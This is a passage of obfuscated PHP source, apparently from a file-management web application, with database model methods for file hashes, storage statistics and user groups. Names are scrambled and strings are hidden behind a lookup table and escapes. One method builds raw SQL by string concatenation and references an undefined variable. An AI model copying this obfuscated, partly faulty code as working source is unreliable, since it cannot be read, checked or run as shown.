array(); foreach ($šê½Éªú as $ïÆü–å›) { $¾´ô±á = $ïÆü–å› . $¯şàÀâ[12]; if (!$ÛÓ˜ïĞ¿[$¾´ô±á]) { $ÛÓ˜ïĞ¿[$¾´ô±á] = 0; } $ÛÓ˜ïĞ¿[$¾´ô±á]++; } $µÙ ÏÌ = array(); foreach ($ÛÓ˜ïĞ¿ as $ïÆü–å› => $ßéÙ’¦µ) { $¾´ô±á = $ßéÙ’¦µ . $¯şàÀâ[12]; if (!$µÙ ÏÌ[$¾´ô±á]) { $µÙ ÏÌ[$¾´ô±á] = array(); } $µÙ ÏÌ[$¾´ô±á][] = $ïÆü–å›; } foreach ($µÙ ÏÌ as $ßéÙ’¦µ => $ïßî¶ñ) { if (!$ïßî¶ñ) { continue; } $ßéÙ’¦µ = $³Ù©ÒÅ ? $ßéÙ’¦µ : -intval($ßéÙ’¦µ); $“¹ú£È = array($¯şàÀâ[468] => array($¯şàÀâ[7], $ïßî¶ñ)); if ($ßéÙ’¦µ < 0) { $“¹ú£È[$¯şàÀâ[1925]] = array($¯şàÀâ[1020], abs($ßéÙ’¦µ)); } $this->where($“¹ú£È)->setAdd($¯şàÀâ[1925], $ßéÙ’¦µ); } } public function findByHash($¦Õ†€ÉÅ, $áº±²“Ê = false) { $ªßšû =& $_SERVER[Ì¥ŞÒ°£]; if (!$¦Õ†€ÉÅ && !$áº±²“Ê) { return !1; } $ÙÑå Ìë = array($ªßšû[1919] => $¦Õ†€ÉÅ); if ($áº±²“Ê) { $ÙÑå Ìë = array($ªßšû[1920] => $áº±²“Ê); } return $this->order($ªßšû[1926])->where($ÙÑå Ìë)->find(); } public function clearEmpty($ı‚ô¾µº = 0) { $ïòÃÎ‚â =& $_SERVER[Ì¥ŞÒ°£]; $åµé‚£ = time() - 3600 * 24 * $ı‚ô¾µº; $ùÅ» ÅØ = $ïòÃÎ‚â[1927] . $åµé‚£; $½òğÙÂù = $this->where($ùÅ» ÅØ)->select(); if (!$½òğÙÂù) { return; } $Åäğ‚Â® = new Task($ïòÃÎ‚â[1928], $ïòÃÎ‚â[12], count($½òğÙÂù)); foreach ($½òğÙÂù as $“‰æÂ©·) { $Åäğ‚Â®->update(1); $this->resetFile($“‰æÂ©·); } $Åäğ‚Â®->end(); } public function resetFile($ßÏ‰«¸Š) { $üçèªîó =& $_SERVER[Ì¥ŞÒ°£]; $Ğ†×±Û× = array($üçèªîó[469] => $ßÏ‰«¸Š[$üçèªîó[468]]); $Èç„¹¦Ö = Model($üçèªîó[1341])->where($Ğ†×±Û×)->count(); $ƒ±‹ = Model($üçèªîó[1929])->where($Ğ†×±Û×)->count(); $Ò½³Ÿ‹ = intval($Èç„¹¦Ö) + intval($ƒ±‹); if ($Ò½³Ÿ‹ == 0) { IO::remove($ßÏ‰«¸Š[$üçèªîó[84]]); Model($üçèªîó[1930])->delete($ßÏ‰«¸Š[$üçèªîó[468]]); $this->where($Ğ†×±Û×)->delete(); $this->metaSet($ßÏ‰«¸Š[$üçèªîó[468]], null, null); return; } if ($ßÏ‰«¸Š[$üçèªîó[1925]] != $Ò½³Ÿ‹) { $this->where($Ğ†×±Û×)->save(array($üçèªîó[1918] => $Ò½³Ÿ‹)); } } public function storageInfo($Œ‡¡ı˜ = false) { $ÁŒ¼Š =& $_SERVER[Ì¥ŞÒ°£]; $®ñüü‹Ê = $this->count() + 0.0; $îä«Ñ ‹ = 0; $¦È×Õ²ˆ = 1; $º‰÷äÎ£ = 0; $®¸ËÔ‰² = 5000; for ($µî€ã” = 0; $µî€ã” < $®ñüü‹Ê; $µî€ã” = $µî€ã” + $®¸ËÔ‰²) { $§ª×Ç€Ò = $this->limit($µî€ã”, $µî€ã” + $®¸ËÔ‰²)->select(); foreach ($§ª×Ç€Ò as $È¼íÔŒ») { $¦È×Õ²ˆ += $È¼íÔŒ»[$ÁŒ¼Š[76]] * $È¼íÔŒ»[$ÁŒ¼Š[1925]]; $îä«Ñ ‹ += $È¼íÔŒ»[$ÁŒ¼Š[76]] * ($È¼íÔŒ»[$ÁŒ¼Š[1925]] - 1); $º‰÷äÎ£ += $È¼íÔŒ»[$ÁŒ¼Š[1925]]; } } $Ó…ëİÀ = array($ÁŒ¼Š[1931] => $¦È×Õ²ˆ, $ÁŒ¼Š[1932] => $îä«Ñ ‹, $ÁŒ¼Š[1933] => $îä«Ñ ‹ / $¦È×Õ²ˆ, $ÁŒ¼Š[80] => $®ñüü‹Ê, $ÁŒ¼Š[1934] => $º‰÷äÎ£); return $Ó…ëİÀ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\160"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\x65" => "\x67\x72\157\x75\160\137\x6d\x65\x74\141", "\155\145\164\x61\x46\151\x65\154\x64" => "\147\x72\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($Ã”¼÷ßó) { $»Ï…æşº =& $_SERVER[Ì¥ŞÒ°£]; return array($»Ï…æşº[1935] => array($Ã”¼÷ßó[0], $»Ï…æşº[1936]), $»Ï…æşº[1937] => array($Ã”¼÷ßó[0], $»Ï…æşº[1938])); } protected function getInfo($òö£§áƒ, $èö—À”• = false) { $¡Æç¹ùú = $this->getInfoSimple($òö£§áƒ); if (!$¡Æç¹ùú) { return !1; } if ($èö—À”•) { return $this->_listDataApplyItem($¡Æç¹ùú); } return $this->cacheFunctionGet($_SERVER[Ì¥ŞÒ°£][1939], $òö£§áƒ); } protected function getInfoSimple($…œû–º­, $ıçøÖ‰é = false) { $Ç‡­µéÓ =& $_SERVER[Ì¥ŞÒ°£]; if ($ıçøÖ‰é) { $Ò›ïƒš = array($Ç‡­µéÓ[1857] => intval($…œû–º­)); $à¹”Ä¢Ç = $this->where($Ò›ïƒš)->find(); return is_array($à¹”Ä¢Ç) ? $à¹”Ä¢Ç : array(); } return $this->cacheFunctionGet($Ç‡­µéÓ[1940], $…œû–º­); } protected function groupAdd($ó¹øÔêÙ) { $Ìº¨©êø =& $_SERVER[Ì¥ŞÒ°£]; if (!$ó¹øÔêÙ[$Ìº¨©êø[432]] && isset($ó¹øÔêÙ[$Ìº¨©êø[1857]]) && $ó¹øÔêÙ[$Ìº¨©êø[1857]] == 1) { if ($‘®¨ê¾Â = $this->getInfoSimple($ó¹øÔêÙ[$Ìº¨©êø[1857]], !0)) { return $ó¹øÔêÙ[$Ìº¨©êø[1857]]; } } else { $‘®¨ê¾Â = $this->getInfoSimple($ó¹øÔêÙ[$Ìº¨©êø[432]]); if (!$‘®¨ê¾Â) { return !1; } } $ºÊË›İÜ = $Ìº¨©êø[531]; if ($‘®¨ê¾Â[$Ìº¨©êø[521]]) { $ºÊË›İÜ = $‘®¨ê¾Â[$Ìº¨©êø[521]] . $‘®¨ê¾Â[$Ìº¨©êø[1857]] . $Ìº¨©êø[50]; } $ãî½–‘ = array($Ìº¨©êø[420] => $this->groupNameAuto($ó¹øÔêÙ[$Ìº¨©êø[432]], $ó¹øÔêÙ[$Ìº¨©êø[32]]), $Ìº¨©êø[401] => $ó¹øÔêÙ[$Ìº¨©êø[432]], $Ìº¨©êø[590] => $ºÊË›İÜ, $Ìº¨©êø[1941] => $ó¹øÔêÙ[$Ìº¨©êø[1844]], $Ìº¨©êø[1942] => 0, $Ìº¨©êø[1861] => 0); if (isset($ó¹øÔêÙ[$Ìº¨©êø[1881]])) { $ãî½–‘[$Ìº¨©êø[1881]] = $ó¹øÔêÙ[$Ìº¨©êø[1881]]; } else { $ãÆ¸»ºÜ = $this->max($Ìº¨©êø[1881]); if (!$ãÆ¸»ºÜ) { $ãÆ¸»ºÜ = 0; } $ãî½–‘[$Ìº¨©êø[1881]] = $ãÆ¸»ºÜ + 1; } if (!empty($ó¹øÔêÙ[$Ìº¨©êø[1857]])) { $ãî½–‘[$Ìº¨©êø[1857]] = $ó¹øÔêÙ[$Ìº¨©êø[1857]]; } $¼æùµíÕ = $this->add($ãî½–‘); $this->setNamePinyin($¼æùµíÕ, $ãî½–‘[$Ìº¨©êø[32]]); if (isset($ó¹øÔêÙ[$Ìº¨©êø[1943]])) { $this->metaSet($¼æùµíÕ, array($Ìº¨©êø[1943] => $ó¹øÔêÙ[$Ìº¨©êø[1943]], $Ìº¨©êø[1944] => $ó¹øÔêÙ[$Ìº¨©êø[1944]])); unset($ó¹øÔêÙ[$Ìº¨©êø[1943]]); unset($ó¹øÔêÙ[$Ìº¨©êø[1944]]); } Model($Ìº¨©êø[1341])->groupRootAdd($¼æùµíÕ); return $¼æùµíÕ; } protected function groupEdit($Ó¹Ø¼—¼, $Ö‡­õ‡³) { $À¾õĞ½Æ =& $_SERVER[Ì¥ŞÒ°£]; $ç²³±É• = $this->getInfoSimple($Ó¹Ø¼—¼); if (!$ç²³±É•) { return !1; } if (!empty($Ö‡­õ‡³[$À¾õĞ½Æ[432]])) { $”‚úëö = $this->getInfoSimple($Ö‡­õ‡³[$À¾õĞ½Æ[432]]); if (!$”‚úëö) { return !1; } if ($ç²³±É•[$À¾õĞ½Æ[1857]] == $”‚úëö[$À¾õĞ½Æ[1857]]) { return !1; } if ($Ö‡­õ‡³[$À¾õĞ½Æ[432]] != $ç²³±É•[$À¾õĞ½Æ[432]]) { if ($”‚úëö[$À¾õĞ½Æ[521]] !== $ç²³±É•[$À¾õĞ½Æ[521]] && strpos($”‚úëö[$À¾õĞ½Æ[521]], $ç²³±É•[$À¾õĞ½Æ[521]] . $ç²³±É•[$À¾õĞ½Æ[1857]] . $À¾õĞ½Æ[50]) === 0) { return !1; } $Ö‡­õ‡³[$À¾õĞ½Æ[590]] = $”‚úëö[$À¾õĞ½Æ[521]] . $Ö‡­õ‡³[$À¾õĞ½Æ[432]] . $À¾õĞ½Æ[50]; $this->_changeChildLevel($ç²³±É•, $”‚úëö); } } if (isset($Ö‡­õ‡³[$À¾õĞ½Æ[32]])) { $this->setNamePinyin($Ó¹Ø¼—¼, $Ö‡­õ‡³[$À¾õĞ½Æ[32]]); } if (isset($Ö‡­õ‡³[$À¾õĞ½Æ[1943]])) { $this->metaSet($Ó¹Ø¼—¼, array($À¾õĞ½Æ[1943] => $Ö‡­õ‡³[$À¾õĞ½Æ[1943]], $À¾õĞ½Æ[1944] => $Ö‡­õ‡³[$À¾õĞ½Æ[1944]])); unset($Ö‡­õ‡³[$À¾õĞ½Æ[1943]]); unset($Ö‡­õ‡³[$À¾õĞ½Æ[1944]]); } $this->_clearChildrenCache($ç²³±É•); return $this->where(array($À¾õĞ½Æ[1945] => $Ó¹Ø¼—¼))->save($Ö‡­õ‡³); } private function _clearChildrenCache($–ïÁûÎõ) { $ßœÄ¼™ =& $_SERVER[Ì¥ŞÒ°£]; $½äğ‘™ = array($ßœÄ¼™[590] => array($ßœÄ¼™[550], $–ïÁûÎõ[$ßœÄ¼™[521]] . $–ïÁûÎõ[$ßœÄ¼™[1857]] . $ßœÄ¼™[551])); $áıß³Øù = $this->field($ßœÄ¼™[1857])->where($½äğ‘™)->select(); foreach ($áıß³Øù as $§ó…Ò³) { $this->_clearCache($§ó…Ò³[$ßœÄ¼™[1857]]); } } private function _clearCache($ó¤úçš¢) { $ûÖ³ÕÄà =& $_SERVER[Ì¥ŞÒ°£]; $this->cacheFunctionClear($ûÖ³ÕÄà[1939], $ó¤úçš¢); $this->cacheFunctionClear($ûÖ³ÕÄà[1940], $ó¤úçš¢); } private function _changeChildLevel($ÔáÙĞ Ñ, $èñòú¥ê, $ŞºÛÁ© = false) { $ƒ¤êñò =& $_SERVER[Ì¥ŞÒ°£]; $ø¨ôËÚ‹ = $ÔáÙĞ Ñ[$ƒ¤êñò[521]] . $ÔáÙĞ Ñ[$ƒ¤êñò[1857]] . $ƒ¤êñò[50]; $œØ˜í = $èñòú¥ê[$ƒ¤êñò[521]] . $èñòú¥ê[$ƒ¤êñò[1857]] . $ƒ¤êñò[50] . $ÔáÙĞ Ñ[$ƒ¤êñò[1857]] . $ƒ¤êñò[50]; if ($ŞºÛÁ©) { $œØ˜í = $èñòú¥ê[$ƒ¤êñò[521]] . $èñòú¥ê[$ƒ¤êñò[1857]] . $ƒ¤êñò[50]; } $Æï·›òı = array($ƒ¤êñò[590] => array($ƒ¤êñò[550], $ÔáÙĞ Ñ[$ƒ¤êñò[521]] . $ÔáÙĞ Ñ[$ƒ¤êñò[1857]] . $ƒ¤êñò[551])); $É£Ÿ¸ıİ = array($ƒ¤êñò[590] => array($ƒ¤êñò[599], "\162\x65\x70\x6c\141\x63\145\x28\x70\x61\x72\x65\156\x74\114\x65\x76\x65\154\x2c\x27{$ø¨ôËÚ‹}\x27\54\47{$œØ˜í}\x27\x29")); $this->_clearChildrenCache($ÔáÙĞ Ñ); $this->where($Æï·›òı)->data($É£Ÿ¸ıİ)->save(); } public function setNamePinyin($úŸ¯Ó÷À, $øôæ¦«¶ = false) { $şçË”Ì =& $_SERVER[Ì¥ŞÒ°£]; if (!$øôæ¦«¶) { $¤¡ğüÄÒ = $this->getInfoSimple($úŸ¯Ó÷À); $øôæ¦«¶ = $¤¡ğüÄÒ[$şçË”Ì[32]]; } if (!Input::check($øôæ¦«¶, $şçË”Ì[593])) { $this->metaSet($úŸ¯Ó÷À, $şçË”Ì[465], null); $this->metaSet($úŸ¯Ó÷À, $şçË”Ì[464], null); return; } $“¤ñÌşø = array($şçË”Ì[465] => str_replace($şçË”Ì[53], $şçË”Ì[12], Pinyin::get($øôæ¦«¶)), $şçË”Ì[464] => Pinyin::get($øôæ¦«¶, $şçË”Ì[594])); $this->metaSet($úŸ¯Ó÷À, $“¤ñÌşø); } protected function groupStatus($ÆÉ”ˆÚà, $ü™ì¥Œ©) { $ãê·ô«• =& $_SERVER[Ì¥ŞÒ°£]; $ù¨Ø©Ş× = $this->getInfoSimple($ÆÉ”ˆÚà); if (!$ù¨Ø©Ş×) { return !1; } if ($ü™ì¥Œ© == $ãê·ô«•[88]) { $ï›’œ†¸ = $this->parentLevelArray($ù¨Ø©Ş×[$ãê·ô«•[521]]); } else { $ŞÙ×àºƒ = array($ãê·ô«•[590] => array($ãê·ô«•[550], $ù¨Ø©Ş×[$ãê·ô«•[521]] . $ù¨Ø©Ş×[$ãê·ô«•[1857]] . $ãê·ô«•[551])); $ï›’œ†¸ = $this->where($ŞÙ×àºƒ)->field($ãê·ô«•[1857])->select(); $ï›’œ†¸ = array_to_keyvalue($ï›’œ†¸, $ãê·ô«•[12], $ãê·ô«•[1857]); } $ï›’œ†¸[] = $ù¨Ø©Ş×[$ãê·ô«•[1857]]; $¼‡Ì„¡ˆ = array(); foreach ($ï›’œ†¸ as $ÆÉ”ˆÚà) { $¼‡Ì„¡ˆ[] = array($ãê·ô«•[1857] => $ÆÉ”ˆÚà, $ãê·ô«•[94] => $ãê·ô«•[752], $ãê·ô«•[374] => $ü™ì¥Œ©); $this->_clearCache($ÆÉ”ˆÚà); } return Model($ãê·ô«•[1946])->addAll($¼‡Ì„¡ˆ, array(), !0); } protected function groupRemove($¡™²ÛÊÀ, $Ãƒã‚‘… = false) { $²†Ö¨Ÿè =& $_SERVER[Ì¥ŞÒ°£]; $–ù“İ» = array($²†Ö¨Ÿè[1857] => $¡™²ÛÊÀ); $¤âª€ß = $this->where($–ù“İ»)->find(); if (!$¤âª€ß || $¤âª€ß[$²†Ö¨Ÿè[432]] == 0) { return !1; } if (!$Ãƒã‚‘…) { $¯Êµ¦ï” = $this->getInfoSimple($¤âª€ß[$²†Ö¨Ÿè[432]]); $this->_changeChildLevel($¤âª€ß, $¯Êµ¦ï”, !0); $this->where(array($²†Ö¨Ÿè[432] => $¡™²ÛÊÀ))->save(array($²†Ö¨Ÿè[432] => $¤âª€ß[$²†Ö¨Ÿè[432]])); } Model($²†Ö¨Ÿè[1946])->where($–ù“İ»)->delete(); Model($²†Ö¨Ÿè[1947])->where($–ù“İ»)->delete(); Model($²†Ö¨Ÿè[827])->groupRootRemove($¡™²ÛÊÀ); return $this->where($–ù“İ»)->delete(); } protected function groupSort($ì»Ê¢·») { $³§‹™ô =& $_SERVER[Ì¥ŞÒ°£]; $Ñµ°Úİ† = array(); foreach ($ì»Ê¢·» as $‘ßÅ—õ· => $½¢©ºı) { $Ñµ°Úİ†[] = array($³§‹™ô[1857], $½¢©ºı, $³§‹™ô[1881], $‘ßÅ—õ· + 1); } $this->saveAll($Ñµ°Úİ†); } public function listData() { $éÀµÌŸÄ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($éÀµÌŸÄ[$_SERVER[Ì¥ŞÒ°£][369]]); return $éÀµÌŸÄ; } private function _makeOrder($—øÏÙÚ = '') { $Š•ö§Çå =& $_SERVER[Ì¥ŞÒ°£]; $šµ¥Ñşş = array($Š•ö§Çå[1857], $Š•ö§Çå[32], $Š•ö§Çå[1846], $Š•ö§Çå[200]); $ùå¼çË = array($Š•ö§Çå[450] => $Š•ö§Çå[451], $Š•ö§Çå[452] => $Š•ö§Çå[453]); $èÔ¦ß¯ = Input::get($Š•ö§Çå[457], $Š•ö§Çå[7], $Š•ö§Çå[1861], $šµ¥Ñşş); $ÕíÎú‚¾ = Input::get($Š•ö§Çå[458], $Š•ö§Çå[7], $Š•ö§Çå[1948], array($Š•ö§Çå[1948], $Š•ö§Çå[452])); $ÕíÎú‚¾ = $ùå¼çË[$ÕíÎú‚¾]; $—øÏÙÚ = $—øÏÙÚ . "{$èÔ¦ß¯}\40{$ÕíÎú‚¾}\54\40\147\162\x6f\x75\160\111\104\x20\141\163\x63"; return $this->order($—øÏÙÚ); } public function listChild($ÈÜ‰„‰·) { $ë¦Øš²Ö =& $_SERVER[Ì¥ŞÒ°£]; $ŞÏº†– = $this->where(array($ë¦Øš²Ö[432] => $ÈÜ‰„‰·))->_makeOrder()->selectPage(200); $this->_listDataApply($ŞÏº†–[$ë¦Øš²Ö[369]]); return $ŞÏº†–; } public function listChildIds($Æãõ÷ÂŞ) { $¸è‰›¹¼ =& $_SERVER[Ì¥ŞÒ°£]; if (is_string($¬ûô·¼Ö)) { $Æãõ÷ÂŞ = explode($¸è‰›¹¼[50], $Æãõ÷ÂŞ); } $ã••˜Éâ = $this->where(array($¸è‰›¹¼[1857] => array($¸è‰›¹¼[7], $Æãõ÷ÂŞ)))->field($¸è‰›¹¼[1949])->select(); if (!$ã••˜Éâ) { return !1; } $üÂÁí¬ = array(); foreach ($ã••˜Éâ as $ñ¤½‹¶) { $üÂÁí¬[] = "\163\x65\154\x65\143\x74\x20\x67\162\157\x75\160\111\x44\40\146\162\157\155\40\140\147\162\157\x75\160\x60\40\167\x68\x65\162\x65\40\160\141\162\145\156\164\x4c\145\166\x65\x6c\x20\154\x69\x6b\145\x20\x27{$ñ¤½‹¶[$¸è‰›¹¼[521]]}{$ñ¤½‹¶[$¸è‰›¹¼[1857]]}\x2c\45\x27"; } $üÂÁí¬ = implode($¸è‰›¹¼[1950], $üÂÁí¬); $ã••˜Éâ = $this->query($üÂÁí¬); if (!$ã••˜Éâ) { return array(); } $Æãõ÷ÂŞ = array_to_keyvalue($ã••˜Éâ, $¸è‰›¹¼[12], $¸è‰›¹¼[1857]); return array_unique($Æãõ÷ÂŞ); } public function listByID($·ß¸–Ì) { $ÒÇÜÎÉ =& $_SERVER[Ì¥ŞÒ°£]; if (!$·ß¸–Ì) { return array(); } $İÇÓâ„ = array($ÒÇÜÎÉ[1857] => array($ÒÇÜÎÉ[7], $·ß¸–Ì)); $˜÷èå¶ = $this->where($İÇÓâ„)->select(); $˜÷èå¶ = array_sort_keep($˜÷èå¶, $ÒÇÜÎÉ[1857], $·ß¸–Ì); $this->_listDataApply($˜÷èå¶); return $˜÷èå¶; } public function listSearch($«û‚‚Ó) { $÷öÏÙİö =& $_SERVER[Ì¥ŞÒ°£]; $ôğ†…ì” = $«û‚‚Ó[$÷öÏÙİö[1951]]; $ƒ–í–±Ö = isset($«û‚‚Ó[$÷öÏÙİö[1952]]) ? $«û‚‚Ó[$÷öÏÙİö[1952]] : !1; if (!trim($ôğ†…ì”)) { return !1; } $ôğ†…ì” = str_replace($÷öÏÙİö[1953], $÷öÏÙİö[1954], $ôğ†…ì”); $©Àı›¹ = array($÷öÏÙİö[1857] => array($÷öÏÙİö[383], "{$ôğ†…ì”}\x25"), $÷öÏÙİö[32] => array($÷öÏÙİö[383], "\45{$ôğ†…ì”}\x25"), $÷öÏÙİö[1005] => $÷öÏÙİö[1955]); if ($ƒ–í–±Ö) { $íŒ³Œ‡ = $this->getInfoSimple($ƒ–í–±Ö); $‡¿«ñŸğ = $íŒ³Œ‡[$÷öÏÙİö[521]] . $ƒ–í–±Ö . $÷öÏÙİö[551]; $©Àı›¹ = array($©Àı›¹, array($÷öÏÙİö[521] => array($÷öÏÙİö[383], $‡¿«ñŸğ))); } $©Àı›¹ = $this->parseWhereLike($©Àı›¹); $÷“ğï´ƒ = $this->_makeOrder()->where($©Àı›¹)->selectPage(20); $÷“ğï´ƒ = $÷“ğï´ƒ ? $÷“ğï´ƒ : array($÷öÏÙİö[369] => array(), $÷öÏÙİö[366] => array()); if (!$÷“ğï´ƒ || count($÷“ğï´ƒ[$÷öÏÙİö[369]]) < 5 && Input::check($ôğ†…ì”, $÷öÏÙİö[318])) { $ññÚ ”¸ = $this->groupChildrenAll($ƒ–í–±Ö); $Óô²¯õ = $this->_searchFromMeta($÷öÏÙİö[464], $ôğ†…ì”, 10, $ññÚ ”¸); $¸îµ®óº = $this->_searchFromMeta($÷öÏÙİö[465], $ôğ†…ì”, 10, $ññÚ ”¸); $¬ğ­â = array_merge($Óô²¯õ, $¸îµ®óº, $÷“ğï´ƒ[$÷öÏÙİö[369]]); $÷“ğï´ƒ[$÷öÏÙİö[369]] = array_unique_by_key($¬ğ­â, $÷öÏÙİö[1857]); $÷“ğï´ƒ[$÷öÏÙİö[366]][$÷öÏÙİö[367]] = count($÷“ğï´ƒ[$÷öÏÙİö[369]]); $÷“ğï´ƒ[$÷öÏÙİö[366]][$÷öÏÙİö[368]] = ceil($÷“ğï´ƒ[$÷öÏÙİö[366]][$÷öÏÙİö[367]] / $÷“ğï´ƒ[$÷öÏÙİö[366]][$÷öÏÙİö[363]]); } $this->_listDataApply($÷“ğï´ƒ[$÷öÏÙİö[369]]); return $÷“ğï´ƒ; } protected function groupChildrenAll($—ñü©¿) { $—ĞãÅ­Ğ =& $_SERVER[Ì¥ŞÒ°£]; if (!$—ñü©¿) { return !1; } if (is_string($—ñü©¿)) { $—ñü©¿ = array($—ñü©¿); } $– ŠÛ’• = $—ñü©¿; foreach ($—ñü©¿ as $á¥©ññ¦) { $ø‡†… = $this->getInfoSimple($á¥©ññ¦); $ª½ÇìŠï = array($—ĞãÅ­Ğ[521] => array($—ĞãÅ­Ğ[383], $ø‡†…[$—ĞãÅ­Ğ[521]] . $á¥©ññ¦ . $—ĞãÅ­Ğ[551])); $ÚœµŒşı = $this->field($—ĞãÅ­Ğ[1857])->where($ª½ÇìŠï)->select(); $– ŠÛ’• = array_merge($– ŠÛ’•, array_to_keyvalue($ÚœµŒşı, $—ĞãÅ­Ğ[12], $—ĞãÅ­Ğ[1857])); } return array_unique($– ŠÛ’•); } private function _searchFromMeta($‘ô¥½Ğˆ, $åĞ¨¿ª, $ŠĞ´ñóâ, $ŠŒô½¼´) { $ˆ¨ÏÓ¼– =& $_SERVER[Ì¥ŞÒ°£]; $åĞ¨¿ª = strtolower($åĞ¨¿ª); $Ô©’ÎÀæ = array($ˆ¨ÏÓ¼–[94] => $‘ô¥½Ğˆ, $ˆ¨ÏÓ¼–[374] => array($ˆ¨ÏÓ¼–[383], "\45{$åĞ¨¿ª}\45")); $Ô©’ÎÀæ = $this->parseWhereLike($Ô©’ÎÀæ); if ($ŠŒô½¼´) { $Ô©’ÎÀæ[$ˆ¨ÏÓ¼–[1857]] = array($ˆ¨ÏÓ¼–[7], $ŠŒô½¼´); } $–íÁÎ– = Model($ˆ¨ÏÓ¼–[1956])->where($Ô©’ÎÀæ)->limit($ŠĞ´ñóâ)->select(); if (!$–íÁÎ–) { return array(); } $–íÁÎ– = array_to_keyvalue($–íÁÎ–, $ˆ¨ÏÓ¼–[12], $ˆ¨ÏÓ¼–[1857]); $á—ëïê = $this->where(array($ˆ¨ÏÓ¼–[1945] => array($ˆ¨ÏÓ¼–[7], $–íÁÎ–)))->select(); if (!$á—ëïê) { return array(); } return $á—ëïê; } protected function _listDataApplyItem($Ä¦–Êü¬) { $‚Öú¿ = array($Ä¦–Êü¬); $this->_listDataApply($‚Öú¿); return $‚Öú¿[0]; } protected function _listDataApply(&$Ë ì¿òï) { $ÎÍâ»ÀÛ =& $_SERVER[Ì¥ŞÒ°£]; if (!$Ë ì¿òï) { return; } $àÓñµĞ¯ = array_to_keyvalue($Ë ì¿òï, $ÎÍâ»ÀÛ[12], $ÎÍâ»ÀÛ[1857]); $this->_listAppendChildren($Ë ì¿òï); $this->_listAppendChildrenMember($Ë ì¿òï); $this->_listAppendMeta($Ë ì¿òï, $àÓñµĞ¯); $this->_listAppendParent($Ë ì¿òï); $this->_listAppendSourceRoot($Ë ì¿òï, $àÓñµĞ¯); } private function _listAppendChildren(&$à¤ïˆ¼†) { $‰’‚Â•¦ =& $_SERVER[Ì¥ŞÒ°£]; $ìÎˆ¾®ƒ = array_to_keyvalue($à¤ïˆ¼†, $‰’‚Â•¦[12], $‰’‚Â•¦[1857]); $¡€ıû‚ = array($‰’‚Â•¦[432] => array($‰’‚Â•¦[7], $ìÎˆ¾®ƒ)); $æ©ÈÍÒê = array($‰’‚Â•¦[432], $‰’‚Â•¦[1957] => $‰’‚Â•¦[500]); $è€ÎÏÖ¨ = $this->field($æ©ÈÍÒê)->where($¡€ıû‚)->group($‰’‚Â•¦[432])->select(); $ÆÀêüúƒ = array_to_keyvalue($è€ÎÏÖ¨, $‰’‚Â•¦[432], $‰’‚Â•¦[500]); foreach ($à¤ïˆ¼† as &$ìšœŒ„Ä) { $âáâ•å = $ìšœŒ„Ä[$‰’‚Â•¦[1857]]; $ìšœŒ„Ä[$‰’‚Â•¦[1958]] = isset($ÆÀêüúƒ[$âáâ•å]) ? intval($ÆÀêüúƒ[$âáâ•å]) : !1; } unset($ìšœŒ„Ä); } private function _listAppendChildrenMember(&$„Ìê½¬) { $İË­ºéÈ =& $_SERVER[Ì¥ŞÒ°£]; $ôÛ‰§ğ = array_to_keyvalue($„Ìê½¬, $İË­ºéÈ[12], $İË­ºéÈ[1857]); $Ç²ê ‡ = array($İË­ºéÈ[1857] => array($İË­ºéÈ[7], $ôÛ‰§ğ)); $Õğ„¬ = array($İË­ºéÈ[1857], $İË­ºéÈ[1957] => $İË­ºéÈ[500]); $İêîëƒ = Model($İË­ºéÈ[1947])->field($Õğ„¬)->where($Ç²ê ‡)->group($İË­ºéÈ[1857])->select(); $ÀÚşƒ = array_to_keyvalue($İêîëƒ, $İË­ºéÈ[1857], $İË­ºéÈ[500]); foreach ($„Ìê½¬ as &$«“û¨½Œ) { $Æ¾®Â = $«“û¨½Œ[$İË­ºéÈ[1857]]; $«“û¨½Œ[$İË­ºéÈ[1959]] = isset($ÀÚşƒ[$Æ¾®Â]) ? intval($ÀÚşƒ[$Æ¾®Â]) : !1; } unset($«“û¨½Œ); } private function _listAppendMeta(&$“™úŞ¿Á, $Ïªö¸³) { $–şÈĞË‚ =& $_SERVER[Ì¥ŞÒ°£]; $€ì›£ä† = array($–şÈĞË‚[1857] => array($–şÈĞË‚[7], $Ïªö¸³)); $«¯ëâ•í = Model($–şÈĞË‚[1946])->where($€ì›£ä†)->select(); $«¯ëâ•í = array_to_keyvalue_group($«¯ëâ•í, $–şÈĞË‚[1857]); foreach ($«¯ëâ•í as &$êË‹¬´Ğ) { $êË‹¬´Ğ = array_to_keyvalue($êË‹¬´Ğ, $–şÈĞË‚[94], $–şÈĞË‚[374]); } unset($êË‹¬´Ğ); foreach ($“™úŞ¿Á as &$õ™ƒÀÚì) { $õ™ƒÀÚì[$–şÈĞË‚[466]] = array(); if (isset($«¯ëâ•í[$õ™ƒÀÚì[$–şÈĞË‚[1857]]])) { $õ™ƒÀÚì[$–şÈĞË‚[466]] = $«¯ëâ•í[$õ™ƒÀÚì[$–şÈĞË‚[1857]]]; } } unset($õ™ƒÀÚì); } protected function parentLevelArray($Îïªğø÷) { $ÎËá¥½Ù =& $_SERVER[Ì¥ŞÒ°£]; $Îïªğø÷ = explode($ÎËá¥½Ù[50], trim($Îïªğø÷, $ÎËá¥½Ù[50])); $Îïªğø÷ = array_remove_value($Îïªğø÷, $ÎËá¥½Ù[197]); return $Îïªğø÷; } protected function parentInGroup($ƒÕ›µÚ, $¸¾„ˆ¡—) { $ÙºüüÒĞ =& $_SERVER[Ì¥ŞÒ°£]; $Íó­Ú· = $this->getInfoSimple($ƒÕ›µÚ); if (!$Íó­Ú·) { return !0; } $ıòĞ‘–ê = $this->parentLevelArray($Íó­Ú·[$ÙºüüÒĞ[521]]); $ıòĞ‘–ê[] = $ƒÕ›µÚ; foreach ($ıòĞ‘–ê as $ƒÕ›µÚ) { if (in_array($ƒÕ›µÚ . $ÙºüüÒĞ[12], $¸¾„ˆ¡—)) { return !0; } } return !1; } private function _listAppendParent(&$åÉÙ´ÂÒ) { $æÉ©Æ¨ô =& $_SERVER[Ì¥ŞÒ°£]; $¹áÁäë’ = array(); foreach ($åÉÙ´ÂÒ as &$•© Çñ) { $¹áÁäë’[$•© Çñ[$æÉ©Æ¨ô[1857]]] = $•© Çñ[$æÉ©Æ¨ô[32]]; $“”êª˜¹ = $this->parentLevelArray($•© Çñ[$æÉ©Æ¨ô[521]]); foreach ($“”êª˜¹ as $‰¢ó©çĞ) { if (!isset($¹áÁäë’[$‰¢ó©çĞ])) { $¹áÁäë’[$‰¢ó©çĞ] = 0; } } } unset($•© Çñ); foreach 